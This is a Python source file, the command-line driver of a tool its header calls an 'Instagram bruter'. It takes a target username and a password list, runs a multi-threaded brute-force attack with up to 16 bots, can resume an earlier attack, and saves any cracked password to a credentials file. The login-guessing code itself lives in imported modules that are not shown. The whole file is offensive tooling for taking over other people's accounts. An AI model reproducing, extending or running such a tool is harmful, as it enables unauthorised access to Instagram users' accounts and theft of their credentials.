# Date: 12/29/2018
# Author: Mohamed
# Description: Instagram bruter

from os.path import exists
from lib.bruter import Bruter
from lib.session import Session 
from lib.display import Display
from lib.const import credentials, modes
from argparse import ArgumentParser, ArgumentTypeError


class Engine(object):

    def __init__(self, username, threads, passlist_path, is_color):  
        self.bruter = None 
        self.resume = False 
        self.is_alive = True 
        self.threads = threads
        self.username = username
        self.passlist_path = passlist_path
        self.display = Display(is_color=is_color)
        self.session = Session(username, passlist_path)
    
    def passlist_path_exists(self):
        if not exists(self.passlist_path):
            self.display.warning('Invalid path to password list')
            return False
        return True 
    
    def session_exists(self):
        return self.session.exists
    
    def create_bruter(self):
        self.bruter = Bruter(self.username, self.threads, self.passlist_path, self.resume)
    
    def get_user_resp(self):
        return self.display.prompt('Would you like to resume the attack? [y/n]: ')
    
    def write_to_file(self, password):
        with open(credentials, 'at') as f:
            data = 'Username: {}\nPassword: {}\n\n'.format(self.username.title(), password)
            f.write(data)

    def start(self):
        if not self.passlist_path_exists():
            self.is_alive = False 
        
        if self.session_exists() and self.is_alive:
            resp = None 

            try:
                resp = self.get_user_resp()
            except:
                self.is_alive = False 
                        
            if resp and self.is_alive:
                if resp.strip().lower() == 'y':
                    self.resume = True 
        
        if self.is_alive:
            self.create_bruter()

            try:
                self.bruter.start()
            except KeyboardInterrupt:
                self.bruter.stop()
                self.bruter.display.shutdown(self.bruter.last_password, 
                                            self.bruter.password_manager.attempts, len(self.bruter.browsers))
            finally:
                self.stop()
    
    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False 

            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
                self.bruter.display.stats_not_found(self.bruter.last_password, 
                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))
            
            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(self.bruter.password, 
                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))
                

def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError('mode must be a number')

    n = int(n)

    if n > 3:
        raise ArgumentTypeError('maximum for a mode is 3')

    if n < 0:
        raise ArgumentTypeError('minimum for a mode is 0')

    return n

def args():
    args = ArgumentParser()
    args.add_argument('username', help='email or username')
    args.add_argument('passlist', help='password list')
    args.add_argument('-nc', '--no-color', dest='color', action='store_true', help='disable colors')
    args.add_argument('-m', '--mode', default=2, type=valid_int, help='modes: 0 => 16 bots; 1 => 8 bots; 2 => 4 bots; 3 => 2 bots')
    return args.parse_args()


if __name__ == '__main__':
    arugments = args()
    mode = arugments.mode 
    username = arugments.username
    passlist = arugments.passlist
    is_color = True if not arugments.color else False 
    Engine(username, modes[mode], passlist, is_color).start()
